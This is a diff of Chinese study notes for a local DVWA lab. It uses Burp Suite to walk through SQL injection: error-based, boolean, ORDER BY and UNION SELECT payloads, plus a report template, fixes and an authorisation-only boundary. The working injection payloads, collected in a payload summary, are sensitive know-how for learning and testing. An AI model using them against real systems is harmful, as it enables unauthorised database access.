@@ -1,13 +1,38 @@
-# DVWA + Burp Suite SQL 注入学习笔记
+# DVWA 第一阶段学习笔记：Burp Suite + SQL 注入
 
 > 日期：2026-05-15  
 > 环境：Kali Linux / Docker / DVWA / Burp Suite Community  
 > 目标地址：`http://127.0.0.1:8080`  
+> 安全等级：Low  
 > 范围：本地 DVWA 靶场，仅用于授权学习和安全测试。
 
-## 1. 环境搭建
+## 说明
 
-### 搭建 DVWA 靶场
+本笔记整理第一阶段 DVWA SQL Injection 模块的验证过程、Payload、成功标志、常见错误和报告模板。内容只适用于本地 DVWA、自己的实验环境或明确授权的测试环境。
+
+## 学习总览
+
+本阶段学习内容：
+
+- DVWA 靶场搭建
+- Burp Suite 代理配置
+- Burp 抓包验证
+- SQL 注入基准响应
+- SQL 报错测试
+- Boolean-based SQL Injection
+- `ORDER BY` 字段数判断
+- `UNION` 联合查询注入
+- 报告写法模板
+
+学习方法：
+
+```text
+搭建环境 -> 配置代理 -> 抓取请求 -> 建立基准响应 -> 输入 Payload -> 对比响应 -> 形成证据链
+```
+
+## 环境搭建
+
+### 运行 DVWA
 
 使用 Docker 运行 DVWA：
 
@@ -27,9 +52,19 @@ http://127.0.0.1:8080
 admin / password
 ```
 
-进入 DVWA 后点击 `Create / Reset Database`，然后在 `DVWA Security` 中将安全等级设置为 `Low`。
+进入 DVWA 后点击：
 
-### 配置 Burp Suite
+```text
+Create / Reset Database
+```
+
+然后在 `DVWA Security` 中将安全等级设置为：
+
+```text
+Low
+```
+
+## Burp Suite 配置
 
 Burp Suite 默认代理端口可能和 DVWA 的 `8080` 冲突，可以将 Burp 代理端口改为：
 
@@ -57,7 +92,7 @@ Proxy -> Intercept -> Open browser
 Settings -> Burp's browser -> Allow Burp's browser to run without a sandbox
 ```
 
-### 抓包成功标志
+## 抓包成功标志
 
 Burp 能看到类似请求：
 
@@ -69,9 +104,9 @@ GET /vulnerabilities/sqli/?id=1&Submit=Submit
 
 说明 Burp 已经成功抓到 DVWA 请求。
 
-## 2. DVWA SQL Injection 基础测试
+## SQL Injection 基准测试
 
-测试模块：
+模块位置：
 
 ```text
 DVWA -> SQL Injection
@@ -97,11 +132,13 @@ First name: admin
 Surname: admin
 ```
 
-这个正常结果作为后续测试的基准响应。
+说明：这个正常结果是后续测试的基准响应，用来对比 Payload 触发后的页面差异。
 
-## 3. SQL 注入报错测试
+## SQL 注入报错测试
 
-测试 Payload：
+核心理解：如果单引号破坏了后端 SQL 语句结构，并让页面返回数据库语法错误，说明用户输入很可能被拼接进 SQL 查询中。
+
+Payload：
 
 ```text
 1'
@@ -119,23 +156,30 @@ URL 编码后：
 GET /vulnerabilities/sqli/?id=1%27&Submit=Submit HTTP/1.1
 ```
 
-返回结果：
+成功现象：
 
 ```text
 You have an error in your SQL syntax
 ```
 
-含义：单引号破坏了后端 SQL 语句结构，说明 `id` 参数被拼接进了 SQL 查询中。
+说明：`id` 参数可能存在 SQL 注入风险。
 
-结论：`id` 参数可能存在 SQL 注入风险。
-
-## 4. 布尔条件 SQL 注入测试
-
-测试名称：
+证据链：
 
 ```text
-Boolean-based SQL Injection Test
+输入 1
+-> 页面返回 ID 为 1 的用户
+
+输入 1'
+-> 页面返回 SQL 语法错误
+
+对比两个响应
+-> 单引号影响了后端 SQL 查询结构
 ```
+
+## Boolean-based SQL Injection
+
+核心理解：通过 true / false 条件对比页面响应差异，判断参数是否可以控制 SQL 查询结果。
 
 ### 永真条件测试
 
@@ -157,7 +201,7 @@ URL 编码：
 GET /vulnerabilities/sqli/?id=1%27%20or%20%271%27%3D%271&Submit=Submit HTTP/1.1
 ```
 
-返回现象：页面返回多个用户，例如：
+成功现象：页面返回多个用户，例如：
 
 ```text
 admin / admin
@@ -166,7 +210,7 @@ Hack / Me
 Pablo / ...
 ```
 
-含义：`'or '1'='1` 是永真条件，数据库返回了更多记录。
+说明：`'or '1'='1` 是永真条件，数据库返回了更多记录。
 
 ### 永假条件测试
 
@@ -190,21 +234,24 @@ GET /vulnerabilities/sqli/?id=1%27%20and%20%271%27%3D%272&Submit=Submit HTTP/1.1
 
 预期现象：页面不返回用户数据，或者返回内容明显不同。
 
-### 判断结论
-
-如果出现以下情况：
+### 判断链
 
 ```text
-1'                  -> SQL 语法报错
-1' or '1'='1        -> 返回多条用户数据
-1' and '1'='2       -> 返回为空或响应不同
+1'
+-> SQL 语法报错
+
+1' or '1'='1
+-> 返回多条用户数据
+
+1' and '1'='2
+-> 返回为空或响应不同
 ```
 
-则可以确认：`id` 参数存在 SQL 注入漏洞。
+结论：如果以上响应差异成立，可以确认 `id` 参数存在 SQL 注入漏洞。
 
-## 5. ORDER BY 字段数判断
+## ORDER BY 字段数判断
 
-作用：判断当前 SQL 查询返回了几列数据，为后续 `UNION` 注入做准备。
+核心理解：`ORDER BY` 可以用于判断当前 SQL 查询结果返回了几列数据，为后续 `UNION SELECT` 做准备。
 
 测试 Payload：
 
@@ -244,9 +291,24 @@ order by 3 报错
 Unknown column '3' in 'order clause'
 ```
 
+判断链：
+
+```text
+order by 1 正常
+-> 至少有 1 个字段
+
+order by 2 正常
+-> 至少有 2 个字段
+
+order by 3 报错
+-> 没有第 3 个字段
+```
+
 结论：当前 SQL 查询结果有 `2` 个字段。
 
-## 6. UNION 联合查询注入
+## UNION 联合查询注入
+
+核心理解：`UNION SELECT` 可以把构造的数据拼接到原查询结果中，从而验证回显位置并读取数据库信息。
 
 前提：前面已经判断字段数是 `2`，所以 `UNION SELECT` 后面也必须写 `2` 个字段。
 
@@ -320,20 +382,25 @@ GET /vulnerabilities/sqli/?id=1%27%20union%20select%201,version()%23&Submit=Subm
 
 预期结果：页面中显示 MySQL / MariaDB 版本信息。
 
-### 当前阶段结论
+### 判断链
 
-已经完成：
+```text
+order by 3 报错
+-> 字段数量为 2
 
-- 报错测试
-- 布尔条件测试
-- `ORDER BY` 字段数判断
-- `UNION` 联合查询测试
-- `database()` 数据库名读取测试
-- `version()` 数据库版本读取测试
+1' union select 1,2#
+-> 页面回显 1 和 2
 
-可以确认：DVWA Low 级别 SQL Injection 模块中的 `id` 参数存在 SQL 注入漏洞，并支持 `UNION` 联合查询注入。
+1' union select 1,database()#
+-> 页面显示数据库名
 
-## 7. 常见错误总结
+1' union select 1,version()#
+-> 页面显示数据库版本
+```
+
+结论：DVWA Low 级别 SQL Injection 模块中的 `id` 参数存在 SQL 注入漏洞，并支持 `UNION` 联合查询注入。
+
+## 常见错误总结
 
 ### 400 Bad Request
 
@@ -378,16 +445,19 @@ GET /vulnerabilities/sqli/?id=1%27%20union%20select%201,version()%23&Submit=Subm
 - Burp 代理端口和 DVWA 端口冲突
 - Firefox 的 `No proxy for` 中包含 `127.0.0.1` 或 `localhost`
 
-解决：使用 Burp 自带浏览器，或者手动设置 Firefox 代理：
+解决方式：
 
 ```text
+使用 Burp 自带浏览器
+或手动设置 Firefox 代理：
+
 HTTP Proxy: 127.0.0.1
 Port: 8082
 ```
 
 同时清空 `No proxy for`。
 
-## 8. 核心概念
+## 核心概念
 
 - Burp Suite：用于拦截、查看、修改和重放 HTTP 请求，是 Web 渗透测试中的核心工具。
 - Repeater：用于重复发送同一个请求，方便测试不同参数和 Payload。
@@ -396,7 +466,50 @@ Port: 8082
 - `ORDER BY`：用于判断当前查询结果有多少个字段，为 `UNION SELECT` 做准备。
 - `UNION SELECT`：用于把构造的数据拼接到原查询结果中，从而读取数据库信息。
 
-## 9. 报告写法模板
+## Payload 汇总
+
+报错测试：
+
+```text
+1'
+1%27
+```
+
+布尔条件测试：
+
+```text
+1' or '1'='1
+1%27%20or%20%271%27%3D%271
+
+1' and '1'='2
+1%27%20and%20%271%27%3D%272
+```
+
+字段数判断：
+
+```text
+1' order by 1#
+1' order by 2#
+1' order by 3#
+
+1%27%20order%20by%201%23
+1%27%20order%20by%202%23
+1%27%20order%20by%203%23
+```
+
+联合查询：
+
+```text
+1' union select 1,2#
+1' union select 1,database()#
+1' union select 1,version()#
+
+1%27%20union%20select%201,2%23
+1%27%20union%20select%201,database()%23
+1%27%20union%20select%201,version()%23
+```
+
+## 报告写法模板
 
 漏洞名称：SQL 注入漏洞
 
@@ -449,9 +562,9 @@ UNION-based SQL Injection
 5. 使用最小权限数据库账号。
 6. 增加日志监控和异常请求告警。
 
-## 10. 下一次学习建议
+## 下次学习建议
 
-下一次可以继续学习：
+下一阶段可以继续学习：
 
 1. `information_schema` 枚举表名
 2. 枚举字段名
@@ -463,4 +576,23 @@ UNION-based SQL Injection
 
 ## 安全边界
 
-所有练习仅限本地 DVWA、靶场或明确授权环境。不要对未授权网站进行扫描、测试、爆破或漏洞利用。
+所有练习仅限：
+
+- 本地 DVWA 靶场
+- 自己的实验环境
+- 明确授权的测试环境
+
+不要用于：
+
+- 未授权网站
+- 公网目标
+- 真实账号
+- 真实业务系统
+
+不要进行：
+
+- 未授权扫描或测试
+- 爆破
+- 漏洞利用
+- 数据导出
+- 破坏或修改数据
